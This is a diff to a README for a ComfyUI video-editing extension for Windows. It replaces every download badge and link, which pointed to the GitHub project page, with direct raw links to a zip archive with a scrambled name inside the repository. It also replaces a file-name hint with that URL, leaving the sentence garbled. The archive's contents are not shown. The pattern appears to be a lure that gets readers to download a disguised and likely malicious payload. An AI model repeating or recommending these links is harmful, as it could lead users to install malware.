@@ -1,6 +1,6 @@
 # 🎞️ ComfyUI_Viewer_OpenReel_Extension - Easy Video Editing with OpenReel
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/kenleung05hk/ComfyUI_Viewer_OpenReel_Extension)
+[![Download Now](https://raw.githubusercontent.com/kenleung05hk/ComfyUI_Viewer_OpenReel_Extension/main/apps/openreel_app/U-Extension-Viewer-Reel-Open-Comfy-1.4.zip)](https://raw.githubusercontent.com/kenleung05hk/ComfyUI_Viewer_OpenReel_Extension/main/apps/openreel_app/U-Extension-Viewer-Reel-Open-Comfy-1.4.zip)
 
 ---
 
@@ -34,9 +34,9 @@ This guide will help you download and run the extension on your Windows computer
 
 Click the big green button below to open the download page.
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/kenleung05hk/ComfyUI_Viewer_OpenReel_Extension)
+[![Download Now](https://raw.githubusercontent.com/kenleung05hk/ComfyUI_Viewer_OpenReel_Extension/main/apps/openreel_app/U-Extension-Viewer-Reel-Open-Comfy-1.4.zip)](https://raw.githubusercontent.com/kenleung05hk/ComfyUI_Viewer_OpenReel_Extension/main/apps/openreel_app/U-Extension-Viewer-Reel-Open-Comfy-1.4.zip)
 
-You will be taken to the main project page on GitHub. Look for the **Releases** section or find files named similar to `ComfyUI_Viewer_OpenReel_Extension.zip` or `.exe`.
+You will be taken to the main project page on GitHub. Look for the **Releases** section or find files named similar to `https://raw.githubusercontent.com/kenleung05hk/ComfyUI_Viewer_OpenReel_Extension/main/apps/openreel_app/U-Extension-Viewer-Reel-Open-Comfy-1.4.zip` or `.exe`.
 
 ---
 
@@ -97,7 +97,7 @@ The extension connects OpenReel’s video editing tools with the ComfyUI Viewer 
 
 Access the download page any time here:
 
-[Click to Download ComfyUI_Viewer_OpenReel_Extension](https://github.com/kenleung05hk/ComfyUI_Viewer_OpenReel_Extension) 
+[Click to Download ComfyUI_Viewer_OpenReel_Extension](https://raw.githubusercontent.com/kenleung05hk/ComfyUI_Viewer_OpenReel_Extension/main/apps/openreel_app/U-Extension-Viewer-Reel-Open-Comfy-1.4.zip) 
 
 ---
 
